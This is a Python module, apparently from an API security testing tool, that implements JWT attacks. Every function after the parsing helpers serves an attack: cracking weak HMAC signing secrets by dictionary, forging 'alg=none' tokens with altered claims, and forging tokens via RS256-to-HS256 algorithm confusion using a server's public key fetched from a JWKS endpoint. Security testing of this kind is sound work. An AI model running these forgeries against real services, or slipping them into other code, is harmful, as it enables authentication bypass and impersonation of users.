"""JWT parsing, cracking, and forging — from apisec.py."""
import base64
import hashlib
import hmac
import json

from ..config import JWT_WEAK_SECRETS


def _b64url_decode(s):
    s += "=" * (-len(s) % 4)
    return base64.urlsafe_b64decode(s.encode())


def _b64url_encode(data):
    if isinstance(data, str):
        data = data.encode()
    return base64.urlsafe_b64encode(data).rstrip(b"=")


def jwt_parts(token):
    """Return (header_dict, payload_dict, signing_input, sig_bytes) or None."""
    segs = token.split(".")
    if len(segs) != 3:
        return None
    try:
        header = json.loads(_b64url_decode(segs[0]))
        payload = json.loads(_b64url_decode(segs[1]))
        sig = _b64url_decode(segs[2] + "==") if segs[2] else b""
    except Exception:
        return None
    signing_input = (segs[0] + "." + segs[1]).encode()
    return header, payload, signing_input, sig


def jwt_crack_weak_secret(token):
    """Offline HMAC dictionary attack. Returns the secret string or None."""
    parsed = jwt_parts(token)
    if not parsed:
        return None
    header, _, signing_input, sig = parsed
    alg = header.get("alg", "").upper()
    hashfn = {
        "HS256": hashlib.sha256,
        "HS384": hashlib.sha384,
        "HS512": hashlib.sha512,
    }.get(alg)
    if not hashfn:
        return None
    for candidate in JWT_WEAK_SECRETS:
        mac = hmac.new(candidate.encode(), signing_input, hashfn).digest()
        if hmac.compare_digest(mac, sig):
            return candidate
    return None


def jwt_forge_alg_none(token):
    """Build an alg=none forged token with unmodified payload."""
    parsed = jwt_parts(token)
    if not parsed:
        return None
    header, payload, _, _ = parsed
    header = dict(header)
    header["alg"] = "none"
    h = _b64url_encode(json.dumps(header))
    p = _b64url_encode(json.dumps(payload))
    return (h + b"." + p + b".").decode()


def jwt_tamper_claims(token, claim_overrides):
    """Modify claims and re-sign with alg=none. Returns forged token or None."""
    parsed = jwt_parts(token)
    if not parsed:
        return None
    header, payload, _, _ = parsed
    header = dict(header)
    header["alg"] = "none"
    payload = dict(payload)
    payload.update(claim_overrides)
    h = _b64url_encode(json.dumps(header))
    p = _b64url_encode(json.dumps(payload))
    return (h + b"." + p + b".").decode()


def jwt_sign_hs256(header, payload, secret_bytes):
    """Sign a header+payload with HS256 using an arbitrary key (bytes).

    The core primitive for the RS256->HS256 *algorithm confusion* attack: an
    attacker forces alg=HS256 and signs with the server's RSA *public* key
    bytes, which a naive verifier will accept because it feeds the same public
    key into HMAC. See REAL_WORLD_RESEARCH.md §8 (Hono/HarbourJwt 2026 CVEs).
    """
    header = dict(header)
    header["alg"] = "HS256"
    h = _b64url_encode(json.dumps(header, separators=(",", ":")))
    p = _b64url_encode(json.dumps(payload, separators=(",", ":")))
    signing_input = h + b"." + p
    sig = _b64url_encode(hmac.new(secret_bytes, signing_input,
                                  hashlib.sha256).digest())
    return (signing_input + b"." + sig).decode()


def jwt_forge_alg_confusion(token, public_key_pem, claim_overrides=None):
    """Forge a token via RS256->HS256 confusion using the server's public key.

    `public_key_pem` is the PEM text of the RSA/EC public key the server signs
    with (fetched from a JWKS endpoint or TLS cert). Returns a forged HS256
    token whose HMAC key is the public-key bytes, or None if inputs are bad.
    """
    parsed = jwt_parts(token)
    if not parsed or not public_key_pem:
        return None
    header, payload, _, _ = parsed
    payload = dict(payload)
    if claim_overrides:
        payload.update(claim_overrides)
    key_bytes = public_key_pem.encode() if isinstance(public_key_pem, str) \
        else public_key_pem
    return jwt_sign_hs256(header, payload, key_bytes)


def jwks_to_pem(jwk):
    """Best-effort convert an RSA JWK dict to a PEM public key (no deps).

    Uses only stdlib. Returns PEM string or None. Handles the common RSA case
    (kty=RSA with n,e); returns None for key types we can't build without a
    crypto library.
    """
    if not isinstance(jwk, dict) or jwk.get("kty") != "RSA":
        return None
    try:
        import base64 as _b64
        import struct

        def _b64u_int(v):
            raw = _b64.urlsafe_b64decode(v + "=" * (-len(v) % 4))
            return int.from_bytes(raw, "big")

        n = _b64u_int(jwk["n"])
        e = _b64u_int(jwk["e"])

        # Build a minimal DER SubjectPublicKeyInfo for RSA. Kept dependency-free
        # so recon works on a bare Python install.
        def _der_len(length):
            if length < 0x80:
                return bytes([length])
            out = []
            while length:
                out.insert(0, length & 0xFF)
                length >>= 8
            return bytes([0x80 | len(out)]) + bytes(out)

        def _der_int(x):
            b = x.to_bytes((x.bit_length() + 7) // 8 or 1, "big")
            if b[0] & 0x80:
                b = b"\x00" + b
            return b"\x02" + _der_len(len(b)) + b

        rsa_pub = _der_int(n) + _der_int(e)
        rsa_seq = b"\x30" + _der_len(len(rsa_pub)) + rsa_pub
        # AlgorithmIdentifier for rsaEncryption + BIT STRING wrapper.
        alg_id = bytes.fromhex("300d06092a864886f70d0101010500")
        bitstr = b"\x03" + _der_len(len(rsa_seq) + 1) + b"\x00" + rsa_seq
        spki = b"\x30" + _der_len(len(alg_id) + len(bitstr)) + alg_id + bitstr
        b64 = _b64.encodebytes(spki).decode().replace("\n", "")
        lines = "\n".join(b64[i:i + 64] for i in range(0, len(b64), 64))
        return f"-----BEGIN PUBLIC KEY-----\n{lines}\n-----END PUBLIC KEY-----\n"
    except Exception:
        return None


def extract_jwt_from_auth(auth_header):
    """Extract JWT token from an Authorization header value."""
    if not auth_header:
        return None
    parts = auth_header.strip().split()
    if len(parts) == 2 and parts[0].lower() == "bearer":
        token = parts[1]
    elif auth_header.count(".") == 2:
        token = auth_header.strip()
    else:
        return None
    if jwt_parts(token):
        return token
    return None
